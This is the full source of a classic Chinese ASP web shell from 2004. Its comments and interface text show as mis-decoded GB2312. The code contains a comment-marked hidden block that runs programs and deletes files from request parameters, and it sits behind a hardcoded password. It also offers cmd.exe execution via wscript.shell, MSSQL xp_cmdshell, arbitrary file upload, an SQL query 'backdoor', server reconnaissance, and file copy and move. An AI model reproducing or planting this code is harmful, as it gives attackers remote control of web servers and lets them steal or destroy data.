   <%@ language="vbscript"  codepage ="936" %>
   <meta http-equiv=content-type content="text/html; charset=gb2312">
   <title>::::º£Ñô¶¥¶ËÍøaspÄ¾Âí£À2004::::</title>
   <style>
   body {
       scrollbar-face-color: #ffe1e8; font-size: 9pt; scrollbar-highlight-color: #ffe1e8; scrollbar-shadow-color: #ff9dbb; color: #f486a8; scrollbar-3dlight-color: #ff97b9; scrollbar-arrow-color: #ff6f8f; scrollbar-track-color: #ffe1e8; scrollbar-darkshadow-color: #ffd9e0
   }
   a:link {
       font-size: 9pt;
       color: #ff69b4;
       text-decoration: none;
   }
   a:visited {
       font-size: 9pt;
       color: #db7093;
       text-decoration: none;
   }
   a:hover {
       font-size: 9pt;
       color: #ffb6c1;
       text-decoration: none;
   }
   table {
       border-collapse: collapse;
       border: 1px dotted #efefef;
       font-size: 9pt;
   }
   .noborder {
       font-size: 9pt;
       border: none;
   }
   input {
       font-size: 9pt;
       color: #c875a5;
       background-image:
       letter-spacing: normal;
       vertical-align: middle;
       word-spacing: normal;
       white-space: normal;
       border: 1px dotted #c875a5;
       clear: both;
       height: auto;
       width: auto;
       background-repeat: repeat;
       overflow: hidden;


   }
   textarea {
       font-size: 9pt;
       background-image:
       letter-spacing: normal;
       vertical-align: middle;
       word-spacing: normal;
       clear: none;
       height: auto;
       width: auto;
       border: 1px dotted #c875a5;
       color: #c875a5;

   }
   select {
       font-size: 9pt;
       background-image:
       letter-spacing: normal;
       vertical-align: middle;
       word-spacing: normal;
       clear: none;
       height: auto;
       width: auto;
       border: 1px dotted #c875a5;
       color: #c875a5;

   }
   .haveborder {
       font-size: 9pt;
       background-image:
       border: 1px solid #c875a5;
   }
   .radio {
       border: 1px solid #eeeeee;
       background-color: #eeeeee;
       font-size: 9pt;
       color: #eeeeee;
       clear: both;
       float: none;
       height: auto;
       width: auto;
       overflow: hidden;
       position: static;
       visibility: inherit;
       clip:    rect(auto auto auto auto);
   }.hborder {
       font-size: 9pt;
       border: 1px solid #c875a5;
       background-color: fef1ef;

   }
   .head-foot {
       background-image: url(images/line4.gif);
       border: 0px none;
       background-repeat: no-repeat;
       background-position: center center;

   }
   </style>

   <% '***************Òþº¬µÄÁíÒ»Ì×´úÂëÖ´ÐÐºÍÉ¾³ý³ÌÐò¿ªÊ¼***************  %>
   <%
   select case request("action")
       case "Ö´ÐÐ"
           result=executefile(trim(request("run")))
           case "del"
                   result=deletefile(trim(request("filename")))
           end select

   function deletefile(filedel)
       on error resume next
       dim fs
       set fs = createobject("scripting.filesystemobject")
   response.write "ÎÄ¼þÉ¾³ý (" & filedel & ")="&cstr(fs.fileexists(filedel))&"<br>"
       if fs.fileexists(filedel) then
          fs.deletefile filedel,true
       end if
       if err>0 then
          err.clear
          deletefile=false
       else
          deletefile=true
       end if
   end function

   function executefile(fileexe)
       set wshshell = server.createobject("wscript.shell")
       retcode = wshshell.run(fileexe, 1, true)
       if retcode = 0 then
           'there were no errors
           executefile=true
       else
           executefile=false
       end if
   response.write "run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
   end function
    %>
   <% '***************Òþº¬µÄÁíÒ»Ì×´úÂë½áÊø***************  %>
   <% '***************Èç¹û²»×öºóÃÅµÄ»°Òª×öÎÄ¼þ¹ÜÀíÆ÷¾ÍÇëÉ¾µôÒÔÉÏÕâ¶ÎÒþº¬´úÂë***************  %>

   <% '***************ÉÏ´«ÎÄ¼þ¿ªÊ¼***************  %>
   <% if request("up")=1 then %>
   <%if instr(request.servervariables("http_referer"),""&request.servervariables("server_name")&"") = 0 then
   response.write "<li><font color=red size=20>²»ÒªºÚÎÒÑ½£¬ÀÏ´ó£¡</font>"
   response.end
   end if%>
   <%server.scripttimeout=5000%>
   <script runat=server language=vbscript>
   dim data_5xsoft
   class upload_5xsoft
   dim objform,objfile,version
   public function form(strform)
   strform=lcase(strform)
   if not objform.exists(strform) then
   form=""
   else
   form=objform(strform)
   end if
   end function
   public function file(strfile)
   strfile=lcase(strfile)
   if not objfile.exists(strfile) then
   set file=new fileinfo
   else
   set file=objfile(strfile)
   end if
   end function
   private sub class_initialize
   dim requestdata,sstart,vbcrlf,sinfo,iinfostart,iinfoend,tstream,istart,thefile
   dim ifilesize,sfilepath,sfiletype,sformvalue,sfilename
   dim ifindstart,ifindend
   dim iformstart,iformend,sformname
   set objform=server.createobject("scripting.dictionary")
   set objfile=server.createobject("scripting.dictionary")
   if request.totalbytes<1 then exit sub
   set tstream = server.createobject("adodb.stream")
   set data_5xsoft = server.createobject("adodb.stream")
   data_5xsoft.type = 1
   data_5xsoft.mode =3
   data_5xsoft.open
   data_5xsoft.write  request.binaryread(request.totalbytes)
   data_5xsoft.position=0
   requestdata =data_5xsoft.read
   iformstart = 1
   iformend = lenb(requestdata)
   vbcrlf = chrb(13) & chrb(10)
   sstart = midb(requestdata,1, instrb(iformstart,requestdata,vbcrlf)-1)
   istart = lenb (sstart)
   iformstart=iformstart+istart+1
   while (iformstart + 10) < iformend
   iinfoend = instrb(iformstart,requestdata,vbcrlf & vbcrlf)+3
   tstream.type = 1
   tstream.mode =3
   tstream.open
   data_5xsoft.position = iformstart
   data_5xsoft.copyto tstream,iinfoend-iformstart
   tstream.position = 0
   tstream.type = 2
   tstream.charset ="gb2312"
   sinfo = tstream.readtext
   tstream.close
   iformstart = instrb(iinfoend,requestdata,sstart)
   ifindstart = instr(22,sinfo,"name=""",1)+6
   ifindend = instr(ifindstart,sinfo,"""",1)
   sformname = lcase(mid (sinfo,ifindstart,ifindend-ifindstart))
   if instr (45,sinfo,"filename=""",1) > 0 then
   set thefile=new fileinfo
   ifindstart = instr(ifindend,sinfo,"filename=""",1)+10
   ifindend = instr(ifindstart,sinfo,"""",1)
   sfilename = mid (sinfo,ifindstart,ifindend-ifindstart)
   thefile.filename=getfilename(sfilename)
   thefile.filepath=getfilepath(sfilename)
   ifindstart = instr(ifindend,sinfo,"content-type: ",1)+14
   ifindend = instr(ifindstart,sinfo,vbcr)
   thefile.filetype =mid (sinfo,ifindstart,ifindend-ifindstart)
   thefile.filestart =iinfoend
   thefile.filesize = iformstart -iinfoend -3
   thefile.formname=sformname
   if not objfile.exists(sformname) then
   objfile.add sformname,thefile
   end if
   else
   tstream.type =1
   tstream.mode =3
   tstream.open
   data_5xsoft.position = iinfoend
   data_5xsoft.copyto tstream,iformstart-iinfoend-3
   tstream.position = 0
   tstream.type = 2
   tstream.charset ="gb2312"
   sformvalue = tstream.readtext
   tstream.close
   if objform.exists(sformname) then
   objform(sformname)=objform(sformname)&", "&sformvalue
   else
   objform.add sformname,sformvalue
   end if
   end if
   iformstart=iformstart+istart+1
   wend
   requestdata=""
   set tstream =nothing
   end sub
   private sub class_terminate
   if request.totalbytes>0 then
   objform.removeall
   objfile.removeall
   set objform=nothing
   set objfile=nothing
   data_5xsoft.close
   set data_5xsoft =nothing
   end if
   end sub
   private function getfilepath(fullpath)
   if fullpath <> "" then
   getfilepath = left(fullpath,instrrev(fullpath, "\"))
   else
   getfilepath = ""
   end if
   end  function
   private function getfilename(fullpath)
   if fullpath <> "" then
   getfilename = mid(fullpath,instrrev(fullpath, "\")+1)
   else
   getfilename = ""
   end if
   end  function
   end class
   class fileinfo
   dim formname,filename,filepath,filesize,filetype,filestart
   private sub class_initialize
   filename = ""
   filepath = ""
   filesize = 0
   filestart= 0
   formname = ""
   filetype = ""
   end sub
   public function saveas(fullpath)
   dim dr,errorchar,i
   saveas=true
   if trim(fullpath)="" or filestart=0 or filename="" or right(fullpath,1)="/" then exit function
   set dr=createobject("adodb.stream")
   dr.mode=3
   dr.type=1
   dr.open
   data_5xsoft.position=filestart
   data_5xsoft.copyto dr,filesize
   dr.savetofile fullpath,2
   dr.close
   set dr=nothing
   saveas=false
   end function
   end class
   </script>
   <%
   dim upload,file,formname,formpath,icount
   set upload=new upload_5xsoft
   if upload.form("filepath")="" then
   response.write "ÇëÊäÈëÒªÉÏ´«ÖÁµÄÄ¿Â¼!"
   set upload=nothing
   response.end
   else
   formpath=upload.form("filepath")
   if right(formpath,1)<>"/" then formpath=formpath&"/"
   end if
   icount=0
   for each formname in upload.objform
   next
   response.write "<br>"
   for each formname in upload.objfile
   set file=upload.file(formname)
   if file.filesize>0 then
   'file.saveas server.mappath(formpath&file.filename)
   'ÐéÄâÂ·¾¶ÉÏ´«
   file.saveas formpath&file.filename
   'ÎïÀíÂ·¾¶ÉÏ´«
   response.write "<center>"&file.filepath&file.filename&" ("&file.filesize&") => "&formpath&file.filename&" ÉÏ´«³É¹¦!</center><br>"
   icount=icount+1
   end if
   set file=nothing
   next
   set upload=nothing
   response.write "<center>"&icount&"¸öÎÄ¼þÉÏ´«½áÊø!</center>"
   response.write "<center><br><a href=""javascript:history.back();""><font color='#d00000'>·µ»ØÉÏÒ»Ò³</font></a></center>"

    '***************ÉÏ´«ÎÄ¼þ½áÊø ***************

   else
   url= request.servervariables("url")
   co=request.servervariables("script_name")

   if trim(request.form("password"))<>"" and trim(request.form("password"))<>"windowscailong" then call out()
   if trim(request.form("password"))="windowscailong" then
   session("password")="allen"
   response.redirect ""&co&""
   else if session("password")<>"allen" then
   call login() 'ÃÜÂë´íÎó
   response.end 'Í£Ö¹ÔËÐÐ
   end if
   select case request("id")
   case "edit"
   call edit()
   case "upload"
   call upload()
   case "dir"
   call dir()
   case "down"
   call downloadfile(request("path"))
   case "inject"
   call inject()
   case else
   call main()
   end select
   end if
   sub login()
   for i=0 to 25
   on error resume next
   isobj=false
   verobj=""
   dim testobj
   set testobj=server.createobject(objtotest(i,0))
   if -2147221005 <> err then
   isobj = true
   verobj = testobj.version
   if verobj="" or isnull(verobj) then verobj=testobj.about
   end if
   objtotest(i,2)=isobj
   objtotest(i,3)=verobj
   next
   %>
   windowscailong<center>
   <%
   dim strusername
   ' È¡µÃÓÃ»§Ãû
   strusername = request.querystring("username")
   if strusername <> "" then
      ' ½¨Á¢ÓÃ»§ÃûµÄcookies
      response.cookies("username") = strusername
   end if
   ' È¡µÃÓÃ»§µÄcookies
   strusername = request.cookies("username")
   ' ÊÇ·ñÓÐÓÃ»§Ãû
   if strusername <> "windowscailong" then
      ' Ã»ÓÐÓÃ»§cookies³öÏÖ¶Ô»°¿òÊäÈëÓÃ»§   %>
   <form name="user" action="<%= request.servervariables("url") %>" method="get">
         <input type="hidden" name="username">
      </form>
      <script language="vbscript">
      <!--
      ' ½øÈëÍøÒ³ÔËÐÐµÄ×Ó³ÌÐò
      sub window_onload
      dim strusername
      ' ³öÏÖ¶Ô»°¿òÊäÈëÓÃ»§Ãû
      strusername=inputbox("ÇëÊäÈëÓÃ»§Ãû½øÈëÕ¾µã", "ÊäÈëÓÃ»§Ãû", "", 300, 200)
      ' ÉèÖÃ±íµ¥ÓòusernameµÄÄÚÈÝ
      user.username.value = strusername
      user.submit   ' ·¢ËÍ±íµ¥Óò
      end sub
      -->
      </script>
   <%else%>
      <center>»¶ÓÓÃ»§[<%=strusername %>]½øÈëÕ¾µã
      </center>
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
   <tr><td>
   <table border=0 width=100% cellspacing=1 cellpadding=0 class="noborder" >
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td width="59%" align=left>&nbsp;·þÎñÆ÷Ãû</td>
   <td width="41%" bgcolor="#eeeeee">&nbsp;<%=request.servervariables("server_name")%></td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷ip</td>
   <td>&nbsp;<%=request.servervariables("local_addr")%></td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷¶Ë¿Ú</td>
   <td>&nbsp;<%=request.servervariables("server_port")%></td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷Ê±¼ä</td>
   <td>&nbsp;<%=now%></td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td align=left>&nbsp;±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶</td>
   <td>&nbsp;<%=server.mappath(request.servervariables("script_name"))%></td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷cpuÊýÁ¿</td>
   <td>&nbsp;<%=request.servervariables("number_of_processors")%> ¸ö</td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷²Ù×÷ÏµÍ³</td>
   <td>&nbsp;<%=request.servervariables("os")%></td>
   </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left>&nbsp¿Í»§¶Ëip: ¶Ë¿Ú [´úÀí]</td><td>&nbsp;<%=request.servervariables("remote_addr")%>|
   <%=request.servervariables("remote_port")%>
   [<%=request.servervariables("http_x_forwarded_for")%>]</td></tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder"><%
   dim t1,t2,lsabc,thetime
   t1=timer
   for i=1 to 500000
   lsabc= 1 + 1
   next
   t2=timer
   thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
   %><td align=left>&nbsp·þÎñÆ÷ÔËËãËÙ¶È²âÊÔ</td>
   <td>&nbsp;<font color=red><%=thetime%> ºÁÃë</font></td>
   </tr>
   </table><center><br>
   <%
   pathlcx=trim(request.form("pathlcx"))
   textlcx=trim(request.form("textlcx"))
   if textlcx<>"" and pathlcx<>"" then
   textlcx=replace(textlcx,">","^>")
   textlcx=replace(textlcx,"<","^<")
   textlcx=replace(textlcx,"&","^&")
   textlcx=replace(textlcx,chr(34),"^"&chr(34))
   textlcx=replace(textlcx,chr(10),"^"&chr(10))
   textlcx=replace(textlcx,chr(13),"^"&chr(13))
   set shell=server.createobject("shell.application")
   set shellfolder=shell.namespace("c:\documents and settings\default user\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\¸½¼þ")
   set shellfolderitem=shellfolder.parsename("¼ÇÊÂ±¾.lnk")
   set objshelllink =shellfolderitem.getlink
   objshelllink.path="cmd.exe"
   objshelllink.arguments="/c echo "&textlcx&">"&pathlcx&" &&del c:\a.lnk"
   objshelllink.save("c:\a.lnk")
   shell.namespace("c:\").items.item("a.lnk").invokeverb
   end if
   %>

   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder"><tr bgcolor="#eeeeee" height=18 class="noborder" style='table-layout:fixed; word-break:break-all'><td align=left>
   <form action="<%= request.servervariables("url") %>" method="post">
   <input type=text name=text value="<%=dsnxa %>">  <font class=fonts>ÊäÈëÒªä¯ÀÀµÄÄ¿Â¼,×îºóÒª¼Ó\</font></td></tr><tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left>
   <input type=text name=text1 value="<%=dsnxa1 %>">
   copy
   <input type=text name=text2 value="<%=dsnxa2 %>"> <font class=fonts>Ä¿µÄµØÖ·²»Òª´øÎÄ¼þÃû</font></td></tr><tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left>
   <input type=text name=text3 value="<%=dsnxa3 %>">
   move
   <input type=text name=text4 value="<%=dsnxa4 %>"><font class=fonts> Ä¿µÄµØÖ·²»Òª´øÎÄ¼þÃû</font></td></tr><tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left>
   Â·¾¶£º<input type=text name=text5 value="<%=dsnxa5 %>" >
   ³ÌÐò£º<input type=text name=text6 value="<%=dsnxa6 %>" ><font class=fonts> ²»¿ÉÒÔ¼Ó²ÎÊý</font></td></tr><tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left><input type="text" name="ok" size=55><font class=fonts> cmdÃüÁî¶Ô»°¿ò</font>
   </td></tr><tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left><input type=text name=pathlcx size=55><font class=fonts> Â·¾¶ÓëÎÄ¼þÃû</font></td><tr/>
   <tr bgcolor="#eeeeee" height=18 class="noborder"><td align=left>
   <textarea  cols=80 rows=5 name=textlcx >
   ÒªÉú³ÉµÄÎÄ¼þÄÚÈÝ£¬²»¿ÉÒÔÓÐ»Ø³µ£º<% ok=request("ok")
   response.write server.createobject ("wscript.shell").exec ("cmd.exe /c "& ok).stdout.readall
   %></textarea>
   <input type=submit name=sb value=·¢ËÍÃüÁî class=input>
   </form></td></tr>
   <script language=vbs>
   sub main()
   base=form8.text1.value
   if isnumeric(base) then
   cc=hex(cstr(base))
   alert("10½øÖÆÎª"&base)
   alert("16½øÖÆÎª"&cc)
   exit sub
   end if
   aa=asc(cstr(base))
   bb=hex(aa)
   alert("10½øÖÆÎª"&aa)
   alert("16½øÖÆÎª"&bb)
   end sub
   sub main2()
   if form8.vars.value <>"" then
   '¶¨ÒåÏà¹Ø±äÁ¿
   dim nums,tmp,tmpstr,i
   nums=form8.vars.value   'È¡µÃ´ÓÓÃ»§¶ËÊäÈë½øÀ´µÄ16½øÖÆÊýÖµ
   nums_len=len(nums)     'µÃ³önumsµÄ³¤¶È

   '¿ªÊ¼Ñ»·£¬´ÎÊýÎªnumsµÄ³¤¶ÈÖµ
   for i=1 to nums_len
       tmp=mid(nums,i,1)    'È¡³önumsµÄµÚ1¸ö×Ö·û´æ·Åµ½ÁÙÊ±±äÁ¿tmpÖÐ
       if isnumeric(tmp) then    'Èç¹ûtmpÖÐµÄÄÚÈÝÊÇÊýÖµÐÍ£¬ÔòÖ´ÐÐÏÂÃæ´úÂë
           tmp=tmp * 16 * (16^(nums_len-i-1))    '´ËÎª16½øÖÆÊýÖµÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
       else
           'ÏÞÖÆÊäÈëµÄ16½øÖÆÊýµÄ·¶Î§ÔÚ0--9¼°a--fÖ®¼ä
           if asc(ucase(tmp))<65 or asc(ucase(tmp))>70 then
               alert("ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«fÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£")
               exit sub
           end if
           tmp=(asc(ucase(tmp))-55) * (16^(nums_len-i))    '´ËÎª16½øÖÆ×Ö·û´®ÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
       end if
           '½«ÉÏÃæ×ª»¯ºóµÄÊýÖµÓëtmpstrÏà¼ÓÀÛ¼Æ³ö×ÜºÍ
           tmpstr=tmpstr+tmp
   next
   alert("×ª»»µÄ10½øÖÆÎª:"&tmpstr&"Æä×Ö·ûÖµÎª:"&chr(tmpstr))
   end if
   end sub
   </script>
   <form name=form8 method="post">
   <input type=text name=text1 value=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ size=30><input type=submit onclick=main() value="¸øÎÒ×ª">
   <input type="text" name="vars" value=16½øÖÆ×ª10½øÖÆºÍ×Ö·û size=30><input type=submit onclick=main2() value="¸øÎÒ×ª">
   </form>
   </table>
   </center>

   <%
   dim strsql, objdbconn, objrs, intfieldcount, intcounter,mdb
   mdb = request.querystring("mdb")
   strsql = request.querystring("sql")
   if strsql <> "" and left(trim(strsql),6)="select" then
      response.write "sql×Ö·û´®: " & strsql & "<br>"
      ' ½¨Á¢Êý¾Ý¿âÁ¬½ÓµÄ¶ÔÏó
      set objdbconn = server.createobject("adodb.connection")
      ' ´ò¿ªÊý¾Ý¿âÁ¬½Ó mdbÇë¸ÄÎªÄãÒªÁ¬½ÓµÄÊý¾Ý¿âÃû×Ö
      objdbconn.open "driver={microsoft access driver (*.mdb)}; dbq=" & server.mappath(mdb)
      ' Ö´ÐÐsqlµÄÊý¾Ý¿â²éÑ¯
      set objrs = objdbconn.execute(strsql)
      ' È¡µÃÓòµÄ¸öÊý
      intfieldcount = objrs.fields.count - 1
      ' ¼ì²éÊÇ·ñÓÐ¼ÇÂ¼
      if not objrs.eof then
         response.write "<table border=1><tr>"
         ' ÏÔÊ¾Êý¾Ý¿âµÄÓòÃû
         for intcounter = 0 to intfieldcount
             response.write "<td><b>" & objrs(intcounter).name & "</b></td>"
         next
         response.write "</tr>"
         ' ÏÔÊ¾Êý¾Ý¿âÄÚÈÝ
         do while not objrs.eof
            response.write "<tr>"
            ' ÏÔÊ¾Ã¿¸ö¼ÇÂ¼µÄÓò
            for intcounter = 0 to intfieldcount
                if objrs.fields(intcounter).value <> "" then
                   response.write "<td valign=""top"">" & objrs.fields(intcounter).value & "</td>"
                else
                   response.write "<td valign=""top"">---</td>"
                end if
            next
            response.write "</tr>"
            objrs.movenext  ' ÒÆµ½ÏÂÒ»Ìõ¼ÇÂ¼
         loop
         response.write "</table>"
      else
         response.write "<b>Ã»ÓÐ·ûºÏÌõ¼þµÄ¼ÇÂ¼</b><br>"
      end if

      objrs.close         ' ¹Ø±Õ¼ÇÂ¼¼¯ºÏ
      set objrs = nothing
      objdbconn.close     ' ¹Ø±ÕÊý¾Ý¿âÁ¬½Ó
      set objdbconn = nothing
   end if
   if strsql <> "" and left(trim(strsql),6)<>"select" then
   %>
   <script>javascript:alert("Õâ²»ÊÇselectÃüÁî\nÇë´ò¿ªÊý¾Ý¿â¿´ÔËÐÐ½á¹û\nº£Ñô¶¥¶ËÍølcx\nÕâ¸öÄã¿ÉÒÔµ±×öÒ»¸öaccess°æsqlºóÃÅ:-)")</script>
   <%
   end if
   %>
   <form  action="<%=url%>"  method="get">
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
     <tr bgcolor="#eeeeee" height=18 class="noborder">
         <td>sql×Ö·û´®:</td>
         <td><input type="text" name="sql" value="<%=strsql%>" size ="30">
     <input type="text" name="mdb" value="acessÊý¾Ý¿âÏà¶ÔÄ¿Â¼¼°Ãû³Æ" size ="30"></td>
      </tr>
   <tr bgcolor="#eeeeee" height=18 class="noborder">
         <td colspan=2 align=center><input type="submit" value="²éÑ¯Êý¾Ý¿â£¬»òÖ´ÐÐÆäËüsqlÓï¾ä"></td>
      </tr>
   </table>

   </form>
   <% if trim(request.form("cmd"))<>""  then %>
   <%
   password= trim(request.form("pa"))
   id=trim(request.form("id"))
   set adoconn=server.createobject("adodb.connection")
   adoconn.open "provider=sqloledb.1;password="&password&";user id="&id
     strquery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'"
     set recresult = adoconn.execute(strquery)
     if not recresult.eof then
      do while not recresult.eof
       strresult = strresult & chr(13) & recresult(0)
       recresult.movenext
      loop
     end if
     set recresult = nothing
     strresult = replace(strresult," ","&nbsp;")
     strresult = replace(strresult,"<","&lt;")
     strresult = replace(strresult,">","&gt;")
     strresult = replace(strresult,chr(13),"<br>")
    end if
    set adoconn = nothing
   %> <br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#b8b8b8" class="noborder">
   <tr bgcolor="#eeeeee" height=18 class="noborder">
   <form name="form" method=post action="<%=request.servervariables("url")%>">
   <input type="text" name="cmd" size=25 >
   <input type="text" name="id" size=10 value="mssqlÓÃ»§Ãû">
   <input type="text" name="pa" size=10 value="mssqlÃÜÂë">
   <input type="submit" value="Ö´ÐÐcmdÃüÁî">
   </form></tr></table><br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#b8b8b8" class="noborder">
   <tr bgcolor="#eeeeee" height=18 class="noborder"><td>
   <form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
   ´«ÖÁ·þÎñÆ÷ÒÑÓÐÄ¿Â¼:
   <input name="filepath" type="text" value="drv:\path" size="15">
   ÎÄ¼þµØÖ·:
   <input type="file" name="file1" value="" size=1>
   <input type="submit" name="submit" value="ÉÏ´«" > ¡¼¾ø¶ÔÂ·¾¶¡½
   </td></tr>
   </form></table>
   <%
    response.write request.form("cmd") & "<br><br>"
    response.write strresult
   %>
   </center>
   <%
   dsnxa = request.form("text")   'Ä¿Â¼ä¯ÀÀ
   if (dsnxa <> "")  then
   set shell=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell.namespace(dsnxa)
   set foditems=fod1.items
   for each co in foditems
   response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
   next
   end if
   %>

   <%
   dsnxa1 = request.form("text1")  'Ä¿Â¼¿½±´£¬²»ÄÜ½øÐÐÎÄ¼þ¿½±´
   dsnxa2 = request.form("text2")
   if dsnxa1<>"" and dsnxa2<>"" then
   set shell1=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell1.namespace(dsnxa2)
   for i=len(dsnxa1) to 1 step -1
   if mid(dsnxa1,i,1)="\" then
      path=left(dsnxa1,i-1)
      exit for
   end if
   next
   if len(path)=2 then path=path & "\"
   path2=right(dsnxa1,len(dsnxa1)-i)
   set fod2=shell1.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.copyhere foditem
   response.write "command completed success!"
   end if
   %>

   <%
   dsnxa3 = request.form("text3")   'Ä¿Â¼ÒÆ¶¯
   dsnxa4 = request.form("text4")
   if dsnxa3<>"" and dsnxa4<>"" then
   set shell2=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell2.namespace(dsnxa4)

   for i=len(dsnxa3) to 1 step -1
   if mid(dsnxa3,i,1)="\" then
      path=left(dsnxa3,i-1)
      exit for
   end if
   next

   if len(path)=2 then path=path & "\"
   path2=right(dsnxa3,len(dsnxa3)-i)
   set fod2=shell2.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.movehere foditem
   response.write "command completed success!"
   end if
   %>
   <%
   dsnxa5 = request.form("text5")    'Ö´ÐÐ³ÌÐòÒªÖ¸¶¨Â·¾¶
   dsnxa6 = request.form("text6")
   if dsnxa5<>"" and dsnxa6<>"" then
   set shell3=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   shell3.namespace(dsnxa5).items.item(dsnxa6).invokeverb
   response.write "command completed success!"
   end if
   %>
   <center><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#b8b8b8" class="noborder">
   <tr bgcolor="#eeeeee" height=18 class="noborder">
         <td colspan=2 align=center><form method="post" action=""&url&"">
   enter password£º<input type="password" name="password" size="20">
   <input type="submit" value="login"></td>
      </tr>
   </form></td></tr></table>
   </center>
   </body>
   <%end if%>
   <%end sub%>
   <%sub main()
   'ÐÞ¸ÄÏÂÃæµÄurlpath¸ÄÎªÄã·þÎñÆ÷µÄÊµ¼Êurl
   urlpath=request.servervariables("server_name")
   dim cpath,lpath
   set fsobrowse=createobject("scripting.filesystemobject")
   if request("path")="" then
   lpath="/"
   else
   lpath=request("path")&"/"
   end if
   if request("attrib")="true" then
   cpath=lpath
   attrib="true"
   else
   cpath=server.mappath(lpath)
   attrib=""
   end if
   %><html>
   <script language="javascript">
   function crfile(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
   return false;
   }
   function crdir(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
   return false;
   }
   </script>
   <script language="vbscript">
   sub rmdir(ls)
   if confirm("ÄãÕæµÄÒªÉ¾³ýÕâ¸öÄ¿Â¼Âð!"&chr(13)&chr(10)&"Ä¿Â¼Îª£º"&ls)   then
   window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
   end if
   end sub
   sub copyfile(sfile)
   dfile=inputbox(""&chr(13)&chr(10)&"Ô´ÎÄ¼þ£º"&sfile&chr(13)&chr(10)&"ÇëÊäÈëÄ¿±êÎÄ¼þµÄÎÄ¼þÃû:"&chr(13)&chr(10)&"Ðí´øÂ·¾¶,Òª¸ù¾ÝÄãµÄµ±Ç°Â·¾¶Ä£Ê½. ×¢Òâ:¾ø¶ÔÂ·¾¶Ê¾Àýc:/»òc:\¶¼¿ÉÒÔ")
   dfile=trim(dfile)
   attrib="<%=request("attrib")%>"
   if dfile<>"" then
   if instr(dfile,":") or instr(dfile,"/")=1 then
   lp=""
   if instr(dfile,":") and attrib<>"true" then
   alert "¶Ô²»Æð£¬ÄãÔÚÏà¶ÔÂ·¾¶Ä£Ê½ÏÂ²»ÄÜÊ¹ÓÃ¾ø¶ÔÂ·¾¶"&chr(13)&chr(10)&"´íÎóÂ·¾¶£º["&dfile&"]"
   exit sub
   end if
   else
   lp="<%=lpath%>"
   end if
   window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
   else
   alert"ÄúÃ»ÓÐÊäÈëÎÄ¼þÃû£¡"
   end if
   end sub
   </script><body bgcolor="#f5f5f5">
   <table cellspacing=1 cellpadding=3 width="750" align=center
   bgcolor=#b8b8b8 border=0 class="noborder">
   <tbody>
   <tr >
   <td
   height=22 colspan="4" bgcolor="#eeeeee" >ÇÐ»»ÅÌ·û£º
   <%
   for each thing in fsobrowse.drives
   response.write "<a href='"&url&"?path="&thing.driveletter&":&attrib=true'>"&thing.driveletter&"ÅÌ:</a>          "
   next
   %>   &nbsp;±¾»ú¾ÖÓòÍøµØÖ·£º
   <%
   set oscriptlcx= server.createobject("wscript.shell")
   set oscriptnetlcx = server.createobject("wscript.network")
   set ofilesyslcx = server.createobject("scripting.filesystemobject")
   %><%= "\\" & oscriptnetlcx.computername & "\" & oscriptnetlcx.username %></td>
   </tr>  <td colspan="4" bgcolor="#eeeeee" ><%
   if request("attrib")="true"  then
   response.write "<a href='"&url&"'><font color='#d00000'>µã»÷ÇÐ»»µ½Ïà¶ÔÂ·¾¶±à¼Ä£Ê½</font></a>"
   else
